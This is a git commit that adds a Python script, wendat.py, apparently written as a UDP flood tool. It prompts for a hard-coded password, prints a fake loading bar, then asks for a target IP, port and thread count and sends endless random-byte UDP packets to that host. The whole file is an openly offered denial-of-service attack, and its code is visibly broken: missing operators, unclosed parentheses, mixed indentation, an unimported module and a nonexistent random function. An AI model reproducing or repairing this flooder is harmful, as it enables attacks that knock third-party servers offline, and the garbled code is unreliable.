89f44f1311deb175e90ff0d2d118ddad46b6d630
DiesellS <103288889+DiesellS@users.noreply.github.com>
2022-04-09 04:40:33 +0700

    Create wendat.py

---
+++ wendat.py
@@ -0,0 +1,88 @@
+import random
+import socket
+import threading
+import os
+
+pasw = "WENDAT"
+
+for i in range(3):
+  pwd input("=====> PASSWORD : ")
+  j = 3
+if (pwd == pasw):
+        time.sleep(2)
+        print("=====> [0%] Loading.......")
+        time.sleep(1)
+        print("=====> [10%] Loading......")
+        time.sleep(1)
+        print("=====> [20%] Loading......")
+        time.sleep(1)
+        print("=====> [35%] Loading......")
+        time.sleep(1)
+        print("=====> [43%] Loading......")
+        time.sleep(1)
+        print("=====> [50%] Loading......")
+        time.sleep(1)
+        print("=====> [58%] Loading......")
+        time.sleep(1)
+        print("=====> [67%] Loading......")
+        time.sleep(1)
+        print("=====> [75%] Loading......")
+        time.sleep(1)
+        print("=====> [80%] Loading......")
+        time.sleep(1)
+        print("=====> [87%] Loading......")
+        time.sleep(1)
+        print("=====> [94%] Loading......")
+        time.sleep(1)
+        print("=====> [100%] Processing\n")
+        time.sleep(2)
+        break
+    else:
+        time.sleep(2)
+        print("=====> WRONG PASSWORD\n")
+        continue
+time.sleep(2)
+print("=====> SUCCESFULL LOGINS")
+time.sleep(2)
+
+os.system("clear")
+print("=====> Author : Diesel's")
+print("=====> Attack by Diesel's")
+ip = str(input("=====> HOST IP : ")
+port = int(input("=====> PORT : ")
+choice = str(input("=====> Ready? (y/n)")
+times = int(input("=====> Methode : ")
+threads = int(input("=====> Threads : ")
+def run():
+  data = random._unrandom(782)
+  i = random.choice(("[Diesel's]"))
+  while True:
+    try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"Diesel's =====> ATTACK IP",ip,"PORT",port,"∆")
+		except:
+			print("Diesel's =====> DONE ATTCAK SERVER IP",ip,"PORT",port,"✓")
+
+def run2():
+  data = random._unrandom(468)
+  i = random.choice(("[Diesel's]"))
+  while True:
+    try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"Diesel's =====> ATTACK IP",ip,"PORT",port,"∆")
+		except:
+			print("Diesel's =====> DONE ATTCAK SERVER IP",ip,"PORT",port,"✓")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
